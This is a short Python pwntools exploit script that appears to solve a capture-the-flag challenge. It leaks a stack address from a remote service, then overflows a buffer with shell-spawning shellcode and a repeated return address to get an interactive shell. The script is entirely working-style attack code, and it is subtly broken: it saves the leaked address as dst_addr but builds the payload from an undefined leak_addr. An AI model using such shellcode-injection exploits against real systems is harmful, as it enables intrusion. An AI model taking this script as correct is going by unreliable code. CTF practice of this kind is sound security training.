from pwn import *

HOST = "securitycheck.challs.cyberchallenge.it"
PORT = 9261

p = remote(HOST, PORT)


payload_1 = 'A' * 255 + '\x00'
p.sendline(payload_1)

p.recvuntil('dst is at')
dst_addr = int(p.recvuntil(', now checking security', drop=True), 16)

payload_2 = fit({
    0: asm(shellcraft.sh()),
    230: p32(leak_addr) * 4,
    254: '\x00'})

p.send(payload_2)
p.interactive()